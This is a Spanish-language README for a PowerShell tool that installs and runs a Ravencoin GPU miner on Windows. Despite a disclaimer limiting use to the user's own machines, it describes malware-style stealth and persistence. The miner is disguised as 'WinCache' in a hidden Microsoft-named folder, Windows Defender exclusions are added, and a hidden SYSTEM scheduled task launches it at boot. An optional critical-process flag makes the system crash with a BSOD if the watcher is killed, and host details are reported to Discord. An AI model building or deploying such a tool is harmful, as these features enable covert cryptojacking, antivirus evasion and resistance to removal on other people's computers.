# AutoMine

Automatización de minería de Ravencoin (RVN) con GMiner en Windows, controlada vía Discord y ejecutada como Tarea Programada con privilegios de SYSTEM.

El script (`Mine.ps1`) descarga GMiner, configura las exclusiones de Windows Defender, registra una tarea de inicio automático y lanza un "watcher" que monitorea el minero, lo reinicia si se cae y envía notificaciones a un canal de Discord. Todo el proceso corre de forma oculta, sin ventanas visibles y sin requerir intervención manual después de la primera instalación.

## Disclaimer

Esta herramienta está diseñada para ser utilizada **únicamente en equipos de tu propiedad** o en entornos donde tengas autorización explícita para minar criptomonedas. El autor no se hace responsable del uso indebido, del consumo eléctrico excesivo, del desgaste del hardware ni de cualquier consecuencia derivada de su ejecución. La minería no autorizada en equipos ajenos es una actividad ilegal.

## Características

- **Instalación todo-en-uno**: descarga GMiner, crea la estructura de carpetas, configura exclusiones de Defender y registra la tarea de inicio en una sola ejecución.
- **Ejecución en segundo plano**: la Tarea Programada se ejecuta con la cuenta `SYSTEM` y `RunLevel Highest`, sin ventanas ni UAC. El minero corre oculto desde el arranque del sistema.
- **Auto-reinicio del minero**: si GMiner se cierra inesperadamente, el watcher lo relanza automáticamente hasta 10 veces con un intervalo de 30 segundos.
- **Notificaciones a Discord vía Webhook**: envía un mensaje al arrancar con los datos del host (worker, pool, algoritmo) y un aviso de fatal si se alcanza el límite de reinicios.
- **Proceso crítico (opcional)**: el watcher puede marcarse como proceso crítico de Windows. Si se intenta cerrar desde el Administrador de Tareas, el sistema lanzará un BSOD. La desinstalación segura revierte este estado.
- **Diagnóstico integrado**: el parámetro `-Diagnose` muestra el estado de la instalación, la tarea programada, las exclusiones de Defender, los procesos activos y las últimas líneas del log.
- **Desinstalación limpia**: `-Uninstall` detiene el minero, elimina la tarea programada, limpia las exclusiones y desmarca el proceso crítico antes de cerrarlo.

## Requisitos

- Windows 10/11 (x64).
- PowerShell 5.1 o superior.
- GPU compatible con KawPoW (NVIDIA o AMD). El perfil de overclock por defecto está pensado para una **RTX 3050** (12–14 MH/s @ ~80–100 W).
- Una dirección de wallet de Ravencoin (RVN).
- Un Webhook de Discord (opcional, pero recomendado para monitoreo remoto).

## Guía de configuración

1. **Clona el repositorio** o descarga el archivo `Mine.ps1` en la máquina que va a minar.

2. **Abre PowerShell como Administrador** (solo la primera vez, para registrar la tarea programada).

3. **Ejecuta el script con tus parámetros**:

   ```powershell
   .\Mine.ps1 -Wallet "TU_WALLET_RVN" `
              -Pool "us-rvn.2miners.com:6060" `
              -Algo "kawpow" `
              -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
   ```

4. El script realizará las siguientes acciones de forma automática:
   - Creará la carpeta `C:\ProgramData\Microsoft\Windows\Caches\WinCache` (oculta).
   - Agregará las exclusiones de Defender para esa carpeta y para `WinCache.exe`.
   - Descargará la última versión de GMiner desde GitHub y la renombrará a `WinCache.exe`.
   - Copiará el propio script a `WinCache.ps1` dentro de la carpeta.
   - Registrará la tarea programada **`WinCacheAgent`** para ejecutarse al inicio del sistema como `SYSTEM`.
   - Lanzará el watcher inmediatamente para comenzar a minar sin esperar un reinicio.

5. **Verifica el estado** con:

   ```powershell
   .\Mine.ps1 -Diagnose
   ```

   Deberías ver la tarea en estado `Running`, el proceso `WinCache` activo y las últimas líneas del log mostrando los shares aceptados.

## Parámetros del script

| Parámetro | Descripción | Valor por defecto |
| :--- | :--- | :--- |
| `-Wallet` | Dirección de la wallet de Ravencoin. | *(requerido)* |
| `-Pool` | Dirección del pool (formato `host:puerto`). | *(requerido)* |
| `-Algo` | Algoritmo de minería. Para RVN es `kawpow`. | `kawpow` |
| `-Worker` | Nombre del rig en el pool. Si se omite, se genera un hash SHA256 del nombre del equipo (`rig_xxxxxx`). | `rig_<hash>` |
| `-DiscordWebhook` | URL del Webhook de Discord para notificaciones. | *(opcional)* |
| `-PowerLimit` | Límite de potencia de la GPU en porcentaje. | `70` |
| `-CoreClock` | Frecuencia fija del núcleo en MHz (`--lock_cclock`). | `1455` |
| `-MemClock` | Offset de memoria en MHz (`--mclock`). | `1000` |
| `-FanSpeed` | Velocidad del ventilador en porcentaje (`--fan`). | `75` |
| `-Foreground` | Ejecuta el watcher en la ventana actual (para depuración). | `false` |
| `-TestWebhook` | Envía un embed de prueba al Webhook y termina. | `false` |
| `-Diagnose` | Muestra el estado de la instalación y los procesos. | `false` |
| `-Uninstall` | Detiene el minero, elimina la tarea y limpia las exclusiones. | `false` |
| `-Run` | Modo interno del watcher. No usar manualmente. | `false` |
| `-NoElevate` | Modo interno para evitar el bucle de UAC. No usar manualmente. | `false` |

## Ejemplos de uso

**Instalación con perfil de overclock personalizado (RTX 3050):**

```powershell
.\Mine.ps1 -Wallet "R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz" `
           -Pool "us-rvn.2miners.com:6060" `
           -Algo "kawpow" `
           -PowerLimit 65 `
           -CoreClock 1400 `
           -MemClock 800 `
           -FanSpeed 70 `
           -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
```

**Probar el Webhook antes de instalar:**

```powershell
.\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
```

**Ver el estado sin detener el minero:**

```powershell
.\Mine.ps1 -Diagnose
```

**Detener y limpiar todo:**

```powershell
.\Mine.ps1 -Uninstall
```

## Estructura de archivos

```
C:\ProgramData\Microsoft\Windows\Caches\WinCache\
├── WinCache.exe      # GMiner (renombrado)
├── WinCache.ps1      # Copia del script de automatización
├── config.json       # Configuración de la tarea (referencia)
└── logs\
    └── miner.log     # Registro de la actividad del minero
```

> **Nota:** El script no crea `config.json` en esta versión; todos los parámetros se inyectan directamente en los argumentos de la Tarea Programada. La carpeta `logs` se crea automáticamente al iniciar el watcher.

## Webhook de Discord

El script envía dos tipos de mensajes al Webhook configurado:

1. **Al arrancar el minero** (`✅ Miner Started Successfully`): incluye el nombre del host, el worker, el pool y el algoritmo.
2. **Si el minero se detiene definitivamente** (`⚠️ Miner Stopped`): se envía cuando se alcanza el límite de 10 reinicios. Indica el número máximo de reinicios alcanzado.

> **Importante:** El Webhook debe tratarse como un secreto. Si se filtra, cualquiera podría enviar mensajes a tu canal. Rótalo periódicamente desde la configuración de Discord.

## Proceso crítico y desinstalación segura

La versión actual del script incluye la posibilidad de marcar el watcher como **proceso crítico** de Windows. Esto significa que, si se intenta cerrar desde el Administrador de Tareas, el sistema operativo lanzará un **BSOD** (pantalla azul) y se reiniciará.

Por esta razón, **nunca cierres el proceso a la fuerza**. Para desinstalar el minero de forma segura, utiliza siempre:

```powershell
.\Mine.ps1 -Uninstall
```

El comando `-Uninstall` revierte el estado crítico, espera unos milisegundos a que Windows lo asimile y luego cierra el proceso sin provocar el colapso del sistema.

## Rendimiento esperado (RTX 3050)

Con el perfil de overclock por defecto:

| Métrica | Valor aproximado |
| :--- | :--- |
| Hashrate (KawPoW) | 12 – 14 MH/s |
| Consumo | 80 – 100 W |
| Eficiencia | ~0.15 – 0.18 MH/W |
| Temperatura | 65 – 75 °C (con fan al 75%) |

Los valores pueden variar según el modelo exacto de la GPU, la ventilación del gabinete y la temperatura ambiente.

## Licencia

Este proyecto se distribuye con fines educativos y de automatización personal. Úsalo bajo tu propia responsabilidad y únicamente en equipos de tu propiedad.
